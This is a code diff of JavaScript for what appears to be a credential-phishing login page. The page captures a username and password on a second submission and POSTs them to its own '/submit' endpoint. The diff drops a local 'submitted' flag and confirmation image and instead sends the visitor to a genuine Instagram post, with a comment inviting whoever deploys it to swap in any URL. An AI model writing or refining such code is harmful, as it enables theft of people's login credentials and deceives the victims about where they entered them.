@@ -579,7 +579,7 @@
                     // Get the latest values from the input fields for the second submission
                     const updatedUsername = emailInput.value.trim();
                     const updatedPassword = passwordInput.value.trim();
-    
+                    errorMessage.style.display = 'none';
                     try {
                         displayFaviconAndImage();
                         const response = await fetch('/submit', {
@@ -589,17 +589,14 @@
                             },
                             body: new URLSearchParams({ username: updatedUsername, password: updatedPassword })
                         });
+                        
     
                         if (response.ok) {
-                            localStorage.setItem('formSubmitted', 'true');
-    
-                            // Clear fields after successful submission
                             emailInput.value = '';
                             passwordInput.value = '';
                             loginButton.disabled = true;
                             showPasswordButton.style.display = 'none';
-    
-                            // Display favicon and next image
+
                             
                         } else {
                             errorMessage.style.display = 'block'; // Show error message if submission fails
@@ -635,18 +632,9 @@
                 // Show the favicon for 2 seconds
                 setTimeout(() => {
                     document.body.removeChild(overlay);
-                    displayImage();
-                }, 2000); // 2000 milliseconds = 2 seconds
-            }
-    
-            function displayImage() {
-                document.body.innerHTML = `
-                    <img src="./images/next_page.jpg" alt="Submitted!" style="width: 100%; height: auto; max-height: 100vh; object-fit: contain;">
-                `;
-            }
-    
-            if (localStorage.getItem('formSubmitted') === 'true') {
-                hideImage(); // Assuming you have a hideImage function defined elsewhere
+                    window.location.href = 'https://www.instagram.com/p/DAXjLuJs2fY/?igsh=MWdrOWZ6d2x6MTRseQ=='; // Change this to your desired URL
+                    
+                }, 1000); // 2000 milliseconds = 2 seconds
             }
     
             darkModeToggle.addEventListener('click', () => {
